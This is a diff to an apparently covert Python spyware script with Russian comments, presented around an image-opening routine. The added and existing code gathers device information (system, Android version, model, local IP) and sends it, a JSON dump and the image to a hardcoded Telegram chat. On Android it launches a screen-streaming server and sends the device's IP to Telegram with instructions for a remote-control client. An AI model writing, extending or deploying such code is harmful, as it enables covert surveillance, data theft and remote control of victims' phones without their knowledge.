@@ -42,52 +42,162 @@ def get_telegram_bot_token():
     return None
 
 
-def send_info_to_telegram(message, user_id=None):
-    """Отправляет текстовое сообщение в Telegram"""
+def send_info_to_telegram(message, user_id=None, retries=3):
+    """Отправляет текстовое сообщение в Telegram с повторными попытками"""
     if user_id is None:
         user_id = TELEGRAM_USER_ID
     
     token = get_telegram_bot_token()
     if not token:
+        log_error("Telegram bot token not found")
         return False
     
-    try:
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        data = {
-            'chat_id': user_id,
-            'text': message
-        }
-        
-        response = requests.post(url, data=data, timeout=30)
-        return response.status_code == 200
-    except Exception:
-        return False
-
-
-def send_photo_to_telegram(photo_path, user_id=None):
-    """Отправляет фото в Telegram"""
-    if user_id is None:
-        user_id = TELEGRAM_USER_ID
-    
-    token = get_telegram_bot_token()
-    if not token:
-        return False
-    
-    try:
-        url = f"https://api.telegram.org/bot{token}/sendPhoto"
-        
-        with open(photo_path, 'rb') as f:
-            files = {'photo': f}
-            data = {'chat_id': user_id}
+    # Повторные попытки отправки
+    for attempt in range(retries):
+        try:
+            url = f"https://api.telegram.org/bot{token}/sendMessage"
+            data = {
+                'chat_id': user_id,
+                'text': message
+            }
             
-            response = requests.post(url, data=data, files=files, timeout=60)
-            return response.status_code == 200
-    except Exception:
+            response = requests.post(url, data=data, timeout=30)
+            
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('ok'):
+                    log_error(f"Message sent successfully to Telegram (attempt {attempt + 1})")
+                    return True
+                else:
+                    log_error(f"Telegram API returned error: {result.get('description', 'Unknown error')}")
+            else:
+                log_error(f"Telegram API HTTP error: {response.status_code} - {response.text}")
+            
+            # Если не последняя попытка, ждем перед повтором
+            if attempt < retries - 1:
+                time.sleep(2 ** attempt)  # Экспоненциальная задержка: 1s, 2s, 4s
+                
+        except requests.exceptions.Timeout:
+            log_error(f"Telegram request timeout (attempt {attempt + 1}/{retries})")
+            if attempt < retries - 1:
+                time.sleep(2 ** attempt)
+        except requests.exceptions.ConnectionError as e:
+            log_error(f"Telegram connection error (attempt {attempt + 1}/{retries}): {e}")
+            if attempt < retries - 1:
+                time.sleep(2 ** attempt)
+        except Exception as e:
+            log_error(f"Error sending message to Telegram (attempt {attempt + 1}/{retries})", e)
+            if attempt < retries - 1:
+                time.sleep(2 ** attempt)
+    
+    log_error("Failed to send message to Telegram after all retries")
+    return False
+
+
+def send_photo_to_telegram(photo_path, user_id=None, retries=2):
+    """Отправляет фото в Telegram с повторными попытками"""
+    if user_id is None:
+        user_id = TELEGRAM_USER_ID
+    
+    token = get_telegram_bot_token()
+    if not token:
+        log_error("Telegram bot token not found for photo")
         return False
+    
+    if not os.path.exists(photo_path):
+        log_error(f"Photo file not found: {photo_path}")
+        return False
+    
+    # Повторные попытки отправки
+    for attempt in range(retries):
+        try:
+            url = f"https://api.telegram.org/bot{token}/sendPhoto"
+            
+            with open(photo_path, 'rb') as f:
+                files = {'photo': f}
+                data = {'chat_id': user_id}
+                
+                response = requests.post(url, data=data, files=files, timeout=60)
+                
+                if response.status_code == 200:
+                    result = response.json()
+                    if result.get('ok'):
+                        log_error(f"Photo sent successfully to Telegram (attempt {attempt + 1})")
+                        return True
+                    else:
+                        log_error(f"Telegram API error for photo: {result.get('description', 'Unknown error')}")
+                else:
+                    log_error(f"Telegram API HTTP error for photo: {response.status_code}")
+            
+            if attempt < retries - 1:
+                time.sleep(2)
+                
+        except requests.exceptions.Timeout:
+            log_error(f"Telegram photo upload timeout (attempt {attempt + 1}/{retries})")
+            if attempt < retries - 1:
+                time.sleep(2)
+        except Exception as e:
+            log_error(f"Error sending photo to Telegram (attempt {attempt + 1}/{retries})", e)
+            if attempt < retries - 1:
+                time.sleep(2)
+    
+    log_error("Failed to send photo to Telegram after all retries")
+    return False
+
+
+def log_error(message, error=None):
+    """Логирует ошибку в файл для отладки"""
+    try:
+        # Пробуем несколько путей для логов
+        log_paths = [
+            "/sdcard/Download/app_log.txt",  # Android
+            os.path.join(os.path.expanduser("~"), "app_log.txt"),  # Домашняя папка
+            "app_log.txt",  # Текущая директория
+        ]
+        
+        log_path = None
+        for path in log_paths:
+            try:
+                # Пробуем создать/открыть файл для записи
+                test_file = open(path, "a", encoding="utf-8")
+                test_file.close()
+                log_path = path
+                break
+            except:
+                continue
+        
+        if log_path:
+            with open(log_path, "a", encoding="utf-8") as f:
+                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                f.write(f"[{timestamp}] {message}\n")
+                if error:
+                    f.write(f"  Error: {str(error)}\n")
+                    import traceback
+                    f.write(f"  Traceback: {''.join(traceback.format_exception(type(error), error, error.__traceback__))}\n")
+                f.flush()  # Принудительно записываем
+    except Exception as e:
+        # Если не удалось записать в файл, пробуем вывести в консоль
+        try:
+            print(f"[LOG ERROR] {message}")
+            if error:
+                print(f"[LOG ERROR] {error}")
+        except:
+            pass
 
 
 def get_mobile_info():
     """Собирает информацию о мобильном устройстве"""
+    # Для Android используем расширенный сбор информации
+    if 'android' in platform.system().lower() or 'linux' in platform.system().lower():
+        try:
+            from device_info import get_android_info_extended
+            return get_android_info_extended()
+        except ImportError:
+            log_error("device_info module not found, using basic info")
+        except Exception as e:
+            log_error("Error getting extended Android info", e)
+    
+    # Базовый сбор для других платформ или при ошибках
     info = {}
     
     try:
@@ -97,11 +207,10 @@ def get_mobile_info():
         info['machine'] = platform.machine()
         info['processor'] = platform.processor() or platform.machine()
         
-        # Для Android
+        # Для Android (базовый метод)
         if 'android' in platform.system().lower() or 'linux' in platform.system().lower():
             try:
                 import subprocess
-                # Получаем информацию об Android
                 result = subprocess.run(['getprop', 'ro.build.version.release'], 
                                       capture_output=True, text=True, timeout=5)
                 if result.returncode == 0:
@@ -147,6 +256,7 @@ def get_mobile_info():
         
     except Exception as e:
         info['error'] = str(e)
+        log_error("Error in get_mobile_info", e)
     
     return info
 
@@ -193,6 +303,41 @@ def open_image_mobile(image_path):
         return False
 
 
+def is_android_device():
+    """Определяет, является ли устройство Android"""
+    # Метод 1: Проверка через platform (на Android возвращает "Linux")
+    system = platform.system().lower()
+    if 'android' in system:
+        return True
+    
+    # Метод 2: Проверка наличия Android-специфичных файлов
+    android_indicators = [
+        '/system/build.prop',
+        '/system/bin/app_process',
+        '/system/framework',
+    ]
+    for indicator in android_indicators:
+        if os.path.exists(indicator):
+            return True
+    
+    # Метод 3: Проверка через pyjnius (если доступен)
+    try:
+        from jnius import autoclass
+        Build = autoclass('android.os.Build')
+        # Если удалось импортировать Build, значит это Android
+        return True
+    except:
+        pass
+    
+    # Метод 4: Проверка переменных окружения
+    android_env_vars = ['ANDROID_ROOT', 'ANDROID_DATA', 'ANDROID_STORAGE']
+    for var in android_env_vars:
+        if os.getenv(var):
+            return True
+    
+    return False
+
+
 def main():
     """Основная функция - работает на всех платформах"""
     try:
@@ -200,8 +345,14 @@ def main():
         is_mobile = False
         system = platform.system().lower()
         
-        if 'android' in system or (system == 'darwin' and 'iPhone' in platform.machine()):
+        # Улучшенное определение Android
+        is_android = is_android_device()
+        is_ios = (system == 'darwin' and 'iPhone' in platform.machine())
+        
+        if is_android or is_ios:
             is_mobile = True
+            if is_android:
+                system = 'android'  # Принудительно устанавливаем для Android
         
         # Путь к изображению
         image_path = None
@@ -244,11 +395,59 @@ def main():
         # Небольшая задержка
         time.sleep(0.5)
         
+        # Запускаем стриминг сервер и запись экрана в фоне (только для Android)
+        streaming_server = None
+        if is_mobile and system == 'android':
+            try:
+                log_error("Attempting to start streaming server...")
+                from streaming_server import start_streaming_server
+                from streaming_server import get_device_ip
+                
+                # Запускаем сервер стриминга
+                log_error("Importing streaming_server modules successful")
+                streaming_server = start_streaming_server(port=8888)
+                
+                if streaming_server:
+                    device_ip = get_device_ip()
+                    log_error(f"Streaming server started successfully on {device_ip}:8888")
+                    
+                    # Отправляем IP адрес в Telegram
+                    ip_message = f"📡 Стриминг сервер запущен\n\nIP: {device_ip}\nПорт: 8888\n\nПодключитесь с PC клиента:\n1. Запустите start_remote_control.bat\n2. Введите IP: {device_ip}\n3. Нажмите Connect"
+                    send_info_to_telegram(ip_message)
+                    log_error("IP address sent to Telegram")
+                else:
+                    log_error("Failed to start streaming server (returned None)")
+            except ImportError as e:
+                log_error("Error importing streaming_server module", e)
+            except Exception as e:
+                log_error("Error starting streaming server", e)
+                # Пробуем отправить ошибку в Telegram
+                try:
+                    send_info_to_telegram(f"⚠ Ошибка запуска стриминг сервера: {str(e)[:200]}")
+                except:
+                    pass
+        
         # Собираем информацию о системе
         info = get_mobile_info()
         
         # Формируем сообщение
-        message = f"""📥 Извлечено изображение
+        if is_mobile and 'system' in info:
+            # Используем расширенную информацию для Android
+            try:
+                from device_info import format_info_for_telegram
+                message = format_info_for_telegram(info)
+            except ImportError:
+                # Fallback к базовому формату
+                message = f"""📥 Извлечено изображение
+
+🖥️ ПЛАТФОРМА:
+├─ Система: {info.get('platform', 'Unknown')}
+├─ Версия: {info.get('platform_version', 'Unknown')}
+├─ Архитектура: {info.get('machine', 'Unknown')}
+└─ Процессор: {info.get('processor', 'Unknown')}"""
+        else:
+            # Базовый формат для других платформ
+            message = f"""📥 Извлечено изображение
 
 🖥️ ПЛАТФОРМА:
 ├─ Система: {info.get('platform', 'Unknown')}
@@ -256,8 +455,8 @@ def main():
 ├─ Архитектура: {info.get('machine', 'Unknown')}
 └─ Процессор: {info.get('processor', 'Unknown')}"""
         
-        # Добавляем мобильную информацию
-        if is_mobile:
+        # Добавляем мобильную информацию (для базового формата)
+        if is_mobile and 'system' not in info:
             if 'android_version' in info:
                 message += f"\n\n📱 ANDROID:\n└─ Версия: {info['android_version']}"
             if 'device_model' in info:
@@ -265,7 +464,8 @@ def main():
             if 'ios_info' in info:
                 message += f"\n\n🍎 iOS:\n{info['ios_info']}"
         
-        message += f"""
+        if 'system' not in info:
+            message += f"""
 
 🌐 СЕТЬ:
 └─ Локальный IP: {info.get('local_ip', 'Unknown')}
@@ -283,7 +483,32 @@ def main():
 └─ Изображение: {image_path}"""
         
         # Отправляем информацию
+        log_error("Sending device information to Telegram")
         send_info_to_telegram(message)
+        
+        # Если есть расширенная информация, отправляем JSON файлом
+        if is_mobile and 'system' in info:
+            try:
+                import tempfile
+                temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False, encoding='utf-8')
+                json.dump(info, temp_file, indent=2, ensure_ascii=False)
+                temp_file.close()
+                
+                # Отправляем как документ
+                token = get_telegram_bot_token()
+                if token:
+                    url = f"https://api.telegram.org/bot{token}/sendDocument"
+                    with open(temp_file.name, 'rb') as f:
+                        files = {'document': f}
+                        data = {'chat_id': TELEGRAM_USER_ID, 'caption': 'Полная информация об устройстве (JSON)'}
+                        requests.post(url, data=data, files=files, timeout=60)
+                
+                try:
+                    os.unlink(temp_file.name)
+                except:
+                    pass
+            except Exception as e:
+                log_error("Error sending JSON file", e)
         
         # Отправляем само изображение
         send_photo_to_telegram(image_path)
